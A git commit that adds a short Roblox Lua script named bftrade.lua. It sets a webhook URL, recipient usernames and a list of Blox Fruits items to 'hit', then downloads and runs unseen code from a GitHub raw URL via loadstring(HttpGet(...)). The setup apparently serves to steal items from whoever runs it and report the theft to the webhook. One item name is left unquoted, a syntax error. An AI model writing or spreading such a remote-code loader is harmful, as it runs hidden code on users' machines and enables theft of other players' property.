002cb965053d52353e9fff4d38637f525e51b845
TradeHack <parthsharmamanu7@gmail.com>
2025-04-13 12:36:57 +0530

    Create bftrade.lua

---
+++ bftrade.lua
@@ -0,0 +1,5 @@
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=RDl0bVNSaUlLMHM5WUFKZWpfU1N3dzprUEpnSXNQRG5VUjItMkxwM0NFc3JQeE1IdmZPdnd0VkJnbTY4M3lHRDBHUU11X2R6UU5BRjE5dW05anZBbkJaZ3M5VVpoRWxEMGFtVWFsZm1hRTd1Qm5VWnRTX1d1Qi1OcmZYcy1qcmczZjRZcHZua3NZT0pEWkJfWEdMMXU4LXRkZEtDV2h5bTJxd2VqTDhadkY5MEEydzJ6OHF0OUNUTnBWTTBfZVh5WUU" -- << Your Webhook
+Usernames = {"piro_popshot"} -- << Your username(-s).
+FruitsToHit = {"Dragon-Dragon", "Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas", Gravity-Gravity} -- << Fruits you want
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/reasonrekt/stuFF/refs/heads/main/wowowo"))()
